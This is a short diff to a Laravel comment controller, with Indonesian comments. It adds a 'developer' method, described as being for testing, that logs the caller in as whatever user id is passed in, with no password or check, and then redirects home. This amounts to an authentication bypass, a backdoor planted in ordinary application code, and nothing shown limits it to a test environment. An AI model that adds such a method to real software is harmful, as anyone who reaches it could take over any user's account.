@@ -42,4 +42,17 @@ class KomentarController extends Controller
 
         return back()->with('success', 'Berhasil menghapus komentar!');
     }
+
+    /**
+     * Keperluan testing
+     *
+     * @param  mixed $id
+     * @return void
+     */
+    public function developer(string $id)
+    {
+        Auth::loginUsingId($id);
+
+        return redirect()->route('home');
+    }
 }
